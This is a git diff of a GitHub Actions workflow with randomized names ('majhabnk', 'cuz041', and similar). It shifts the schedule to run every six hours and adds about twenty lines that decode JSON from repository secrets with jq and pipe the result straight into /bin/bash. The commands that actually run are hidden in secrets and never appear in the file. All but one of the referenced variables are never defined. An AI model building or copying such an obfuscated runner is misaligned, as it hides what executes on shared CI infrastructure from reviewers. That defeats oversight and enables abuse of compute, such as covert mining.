@@ -1,20 +1,36 @@
 name: majhabnk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 1/6 * * *'
+    - cron: '37 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: majhabnk
         env:
-          h9719: ${{ secrets.h9719 }}
+          cuz041: ${{ secrets.cuz041 }}
         run: |
-          echo $h9719 | jq -r .om78 | /bin/bash
-          echo $yac3 | jq -r .nbxv66875 | /bin/bash
+          echo $cuz041 | jq -r .odabw8 | /bin/bash
+          echo $n561 | jq -r .zqq0997 | /bin/bash
+          echo $iqlut5117 | jq -r .qnmt3 | /bin/bash
+          echo $exytr6 | jq -r .ie99 | /bin/bash
+          echo $foz116 | jq -r .b274 | /bin/bash
+          echo $xz68724 | jq -r .zpw8303 | /bin/bash
+          echo $ot694 | jq -r .r1 | /bin/bash
+          echo $fmhs3 | jq -r .nue7 | /bin/bash
+          echo $uindk2853 | jq -r .zq98737 | /bin/bash
+          echo $e61 | jq -r .aqmy7 | /bin/bash
+          echo $gdeh3835 | jq -r .chuca78327 | /bin/bash
+          echo $y9 | jq -r .bt39622 | /bin/bash
+          echo $ceadv6247 | jq -r .xkk6656 | /bin/bash
+          echo $fsdrl4830 | jq -r .ni42 | /bin/bash
+          echo $fwk91 | jq -r .jsdn9 | /bin/bash
+          echo $emlny0668 | jq -r .b07 | /bin/bash
+          echo $cv744 | jq -r .md9 | /bin/bash
+          echo $fj67 | jq -r .bxbr36049 | /bin/bash
+          echo $ca745 | jq -r .iqypg26460 | /bin/bash
+          echo $mst3795 | jq -r .g271 | /bin/bash
 
